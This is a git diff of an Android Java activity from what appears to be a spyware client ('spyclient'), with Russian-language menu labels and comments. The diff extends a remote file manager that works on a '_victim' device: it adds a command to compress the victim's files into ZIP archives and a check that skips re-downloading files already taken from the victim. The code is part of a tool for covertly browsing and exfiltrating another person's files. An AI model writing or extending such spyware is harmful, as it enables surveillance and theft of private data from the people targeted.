@@ -1,5 +1,6 @@
 package slade.carter.spyclient;
 
+import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.os.Bundle;
@@ -43,7 +44,6 @@ public class FileManagerActivity extends AppCompatActivity {
 
     private String _bufferPath; //для copy-paste файлов
     private String _bufferFile; //для copy-paste файлов
-    private String _downloadFilename; //для скачивания файла
 
     public static FileManagerActivity getInstance() {
         return _instanse;
@@ -192,6 +192,7 @@ public class FileManagerActivity extends AppCompatActivity {
     public void onCreateContextMenu(ContextMenu menu, View v, ContextMenu.ContextMenuInfo menuInfo) {
         menu.add("Скачать");
         menu.add("Информация");
+        menu.add("Сжать в ZIP");
         menu.add("Переименовать");
         menu.add("Скопировать");
         menu.add("Удалить");
@@ -208,11 +209,18 @@ public class FileManagerActivity extends AppCompatActivity {
         String itemName = item.toString();
         switch (itemName) {
             case "Скачать":
-                _downloadFilename = ((TextView)info.targetView).getText() + "";
-                nettyClient.sendStartDownloadFile(_victim, path, Config.DOWNLOAD_PATH);
+                String filename = ((TextView)info.targetView).getText().toString();
+                File file = new File(Config.DOWNLOAD_PATH + filename);
+                if (file.exists()) {
+                    MainActivity.getInstance().showText("Файл уже у Вас!");
+                } else
+                    nettyClient.sendStartDownloadFile(_victim, path, Config.DOWNLOAD_PATH);
                 break;
             case "Информация":
                 nettyClient.sendGetFileInfo(_victim, path);
+                break;
+            case "Сжать в ZIP":
+                nettyClient.sendBuildZip(path, _victim);
                 break;
             case "Переименовать":
                 /* LayoutInflater – это класс, который умеет из содержимого layout-файла создать View-элемент.
